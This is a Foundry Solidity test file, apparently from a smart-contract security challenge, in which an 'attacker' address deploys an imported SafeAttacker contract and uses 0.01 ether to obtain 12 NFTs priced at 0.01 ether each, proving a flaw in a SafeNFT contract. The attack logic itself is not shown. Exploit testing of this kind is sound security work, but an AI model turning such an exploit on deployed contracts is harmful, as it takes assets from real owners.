// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/safeNFT/SafeNFT.sol";
import "../src/safeNFT/SafeAttacker.sol";

contract SafeNftExploit is Test {
    address wojak;
    address manager;
    SafeAttacker internal safeAttacker;
    SafeNFT internal safenft;

    function setUp() public {
        //Characters
        manager = makeAddr("manager");
        wojak = makeAddr("wojak");
        // Characters labelling...
        vm.label(manager, "bogdanOff");
        vm.label(wojak, "attacker");

        //Equity
        vm.deal(manager, 0.1 ether);
        vm.deal(wojak, 0.01 ether);
        //manager delpoys the nft contract with the price 0.01 ETH for each NFT
        uint256 price = 0.01 ether;
        vm.startPrank(manager);
        safenft = new SafeNFT("RektToMoon", "RTM", price);
        vm.stopPrank();
        //
    }

    function testExploit() public {
        vm.startPrank(wojak);
        safeAttacker = new SafeAttacker(address(safenft));
        // using 0.01 ether balance we buy 12 NFTS
        safeAttacker.attack{value: address(wojak).balance}(12);

        vm.stopPrank();
        assertEq(safenft.balanceOf(address(wojak)), 12);
    }
}
